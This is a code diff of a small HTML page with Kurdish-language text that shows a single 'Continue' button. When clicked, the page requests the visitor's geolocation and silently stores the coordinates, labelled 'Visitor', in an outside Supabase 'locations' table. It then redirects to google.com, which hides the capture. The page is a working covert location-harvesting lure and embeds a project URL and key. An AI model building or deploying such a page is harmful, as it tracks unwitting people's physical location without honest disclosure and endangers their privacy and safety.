@@ -15,9 +15,6 @@
       height: 100vh;
       margin: 0;
     }
-    .container {
-      text-align: center;
-    }
     button {
       background-color: #ffffff;
       color: #000000;
@@ -27,60 +24,46 @@
       font-weight: bold;
       border-radius: 8px;
       cursor: pointer;
-      transition: opacity 0.2s;
-    }
-    button:active {
-      opacity: 0.8;
-    }
-    #status {
-      margin-top: 20px;
-      font-size: 14px;
-      color: #888888;
     }
   </style>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 </head>
 <body>
 
-  <div class="container">
-    <button id="btn">بەردەوام بوون</button>
-    <div id="status"></div>
-  </div>
+  <button id="btn">بەردەوام بوون</button>
 
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <script>
     const SUPABASE_URL = "https://mxichdljcrlcomnhkcin.supabase.co";
     const SUPABASE_KEY = "sb_publishable_SlntFaOIzECUYXOwVUzmDQ_cLzgxh-P";
 
     const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-    document.getElementById('btn').addEventListener('click', () => {
-      const status = document.getElementById('status');
-
+    document.getElementById('btn').addEventListener('click', function() {
       if (!navigator.geolocation) {
-        status.innerText = "Geolocation is not supported.";
+        alert("Geolocation پشتیوانی ناهێنرێت لەم مۆبایلە/بڕاوسەرە!");
+        window.location.href = "https://www.google.com";
         return;
       }
 
       navigator.geolocation.getCurrentPosition(
-        async (pos) => {
+        async function(pos) {
           try {
             await supabase.from('locations').insert([{
               name: 'Visitor',
               latitude: pos.coords.latitude,
               longitude: pos.coords.longitude
             }]);
-            
-            // دوای تۆمارکردنی شوێنەکەی دەتوانیت ڕەوانەی ماڵپەڕێکی تری بکەیت (نموونە: Google)
+          } catch (e) {
+            console.log(e);
+          } finally {
             window.location.href = "https://www.google.com";
-          } catch (err) {
-            console.error(err);
           }
         },
-        (err) => {
-          // ئەگەر ڕەزامەندی نەدا یان هەڵەیەک ڕووبدات
+        function(err) {
+          alert("هەڵە لە وەرگرتنی شوێن: " + err.message);
           window.location.href = "https://www.google.com";
         },
-        { enableHighAccuracy: true, timeout: 15000 }
+        { enableHighAccuracy: false, timeout: 10000 }
       );
     });
   </script>
